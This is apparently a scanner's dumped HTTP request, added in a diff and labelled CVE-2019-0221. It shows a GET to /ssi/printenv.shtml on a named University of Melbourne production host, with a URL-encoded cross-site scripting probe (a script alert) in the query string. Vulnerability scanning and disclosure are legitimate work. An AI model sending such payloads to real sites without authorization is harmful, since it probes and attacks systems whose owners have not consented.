@@ -1,0 +1,12 @@
+[CVE-2019-0221] Dumped HTTP request for https://science-web-prod-bachelor2-all-sites-lb.science.unimelb.edu.au/ssi/printenv.shtml?%3Cscript%3Ealert(526650718)%3C%2Fscript%3E
+
+
+GET /ssi/printenv.shtml?%3Cscript%3Ealert(526650718)%3C%2Fscript%3E HTTP/1.1
+Host: science-web-prod-bachelor2-all-sites-lb.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
